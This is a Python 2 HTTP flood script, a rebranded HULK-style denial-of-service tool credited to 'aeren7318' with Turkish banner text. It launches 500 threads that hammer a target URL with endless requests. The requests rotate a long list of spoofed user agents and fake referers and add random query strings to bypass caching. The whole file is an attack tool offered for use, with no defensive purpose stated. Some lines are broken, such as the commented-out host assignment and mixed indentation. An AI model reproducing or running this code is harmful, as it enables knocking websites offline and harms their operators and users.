# -*- coding: utf-8 -*-

print '---------------------------------------------------'
print 'bu script aeren7318 tarafından yapıldı calanların amk'
print 'hiçbir sorumluluk bana ait degil'
print '---------------------------------------------------'
import urllib2
import sys
import threading
import random
import re

#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Bloglines/3.1 (http://www.bloglines.com)')
	headers_useragents.append('CSSCheck/1.2.2')
	headers_useragents.append('Dillo/2.0')
	headers_useragents.append('DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)')
	headers_useragents.append('DoCoMo/2.0 SH901iC(c100;TB;W24H12)')
	headers_useragents.append('Download Demon/3.5.0.11')
	headers_useragents.append('ELinks/0.12~pre5-4')
	headers_useragents.append('ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33)')
	headers_useragents.append('ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)')
	headers_useragents.append('EmailWolf 1.00')
	headers_useragents.append('everyfeed-spider/2.0 (http://www.everyfeed.com)')
	headers_useragents.append('facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)')
	headers_useragents.append('FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler)')
	headers_useragents.append('FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)')
	headers_useragents.append('Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2')
	headers_useragents.append('Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0')
	headers_useragents.append('Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34')
	headers_useragents.append('Links/0.9.1 (Linux 2.4.24; i386;)')
	headers_useragents.append('Links (2.1pre15; FreeBSD 5.3-RELEASE i386; 196x84)')
	headers_useragents.append('Links (2.1pre15; Linux 2.4.26 i686; 158x61)')
	headers_useragents.append('Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)')
	headers_useragents.append('Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12')
	headers_useragents.append('Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d')
	headers_useragents.append('Mediapartners-Google')
	headers_useragents.append('Microsoft URL Control - 6.00.8862')
	headers_useragents.append('Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2)')
	headers_useragents.append('MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0')
	headers_useragents.append('MOTORIZR-Z8/46.00.00 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 356) Opera 8.65 [it] UP.Link/6.3.0.0.0')
	headers_useragents.append('MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0')
	headers_useragents.append('SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0')
	headers_useragents.append('SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('SonyEricssonT100/R101')
	headers_useragents.append('SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0')
	headers_useragents.append('SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0')
	headers_useragents.append('SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('Wget/1.9.1)')
	headers_useragents.append('wii libnup/1.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US)')
	headers_useragents.append('SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0')
	headers_useragents.append('SuperBot/4.4.0.60 (Windows XP)')
	headers_useragents.append('Uzbl (Webkit 1.3) (Linux i686 [i686])')
	headers_useragents.append('Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1')
	headers_useragents.append('W3C_Validator/1.654')
	headers_useragents.append('w3m/0.5.1')
        headers_useragents.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	headers_useragents.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	headers_useragents.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	headers_useragents.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	headers_useragents.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	headers_useragents.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	headers_useragents.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	headers_useragents.append('WDG_Validator/1.6.2')
	headers_useragents.append('WebCopier v4.6)')
	headers_useragents.append('Web Downloader/6.9)')
	headers_useragents.append('WebZIP/3.5 (http://www.spidersoft.com')
	headers_useragents.append('Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30')
	headers_useragents.append('Opera/7.50 (Windows ME; U) [en]')
	headers_useragents.append('Opera/7.50 (Windows XP; U)')
	headers_useragents.append('Opera/7.51 (Windows NT 5.1; U) [en]')
	headers_useragents.append('Opera/8.01 (J2ME/MIDP; Opera Mini/1.0.1479/HiFi; SonyEricsson P900; no; U; ssr')
	headers_useragents.append('Opera/9.0 (Macintosh; PPC Mac OS X; U; en)')
	headers_useragents.append('Opera/9.20 (Macintosh; Intel Mac OS X; U; en)')
	headers_useragents.append('Opera/9.25 (Windows NT 6.0; U; en)')
	headers_useragents.append('Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)')
	headers_useragents.append('Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)')
	headers_useragents.append('Opera/9.5 (Microsoft Windows; PPC; Opera Mobi; U) SonyEricssonX1i/R2AA Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.1.11320/608; U; en) Presto/2.2.0')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14320/554; U; cs) Presto/2.2.0')
	headers_useragents.append('Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1')
	headers_useragents.append('Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0')
	headers_useragents.append('Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00')
	headers_useragents.append('Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52')
	headers_useragents.append('Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61')
	headers_useragents.append('Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10')
	headers_useragents.append('Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01')
	headers_useragents.append('Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00')
	headers_useragents.append('Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10')
	headers_useragents.append('Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00')
	headers_useragents.append('msnbot/0.11 ( http://search.msn.com/msnbot.htm)')
	headers_useragents.append('msnbot/1.0 ( http://search.msn.com/msnbot.htm)')
	headers_useragents.append('msnbot/1.1 ( http://search.msn.com/msnbot.htm)')
	headers_useragents.append('NetSurf/1.2 (NetBSD; amd64)')
	headers_useragents.append('Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0')
	headers_useragents.append('Nokia6100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0')
	headers_useragents.append('Nokia6230/2.0 (04.44) Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('Nokia6230i/2.0 (03.80) Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1')
	headers_useragents.append('Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0')
	headers_useragents.append('NokiaN70-1/5.0609.2.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0')
	headers_useragents.append('NokiaN73-1/3.0649.0.0.1 Series60/3.0 Profile/MIDP2.0 Configuration/CLDC-1.1')
	headers_useragents.append('Mozilla/5.0 (Linux; U; Android 1.5; en-us; htc_bahamas Build/CRB17) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1')
	headers_useragents.append('Mozilla/5.0 (Linux; U; Android 1.5; en-us; sdk Build/CUPCAKE) AppleWebkit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1')
	headers_useragents.append('Mozilla/5.0 (Linux; U; Android 1.5; en-us; SPH-M900 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1')
	headers_useragents.append('Mozilla/5.0 (Linux; U; Android 1.5; en-us; T-Mobile G1 Build/CRB43) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari 525.20.1')
	headers_useragents.append('Mozilla/5.0 (Linux; U; Android 1.5; fr-fr; GT-I5700 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1')
	headers_useragents.append('Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1')
	headers_useragents.append('Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1')
	headers_useragents.append('Mozilla/5.0 (Linux; U; Android 1.6; es-es; SonyEricssonX10i Build/R1FA016) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1')
	headers_useragents.append('Mozilla/5.0 (Linux; U; Android 2.0.1; de-de; Milestone Build/SHOLS_U2_01.14.0) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print '---------------------------------------------------'
	print 'BU SCRIPT AEREN7318 TARAFINDAN GELISTIRILMISTIR.'
	print '---------------------------------------------------'

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print 'site Allahına kavusuyor'
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Requests Sent" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n-- aeren7318 Attack Finished --"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "-- aeren7318 Attack Started --"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('(https?\://)?([^/]*)/?.*', url)
#		host = m.group(2)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
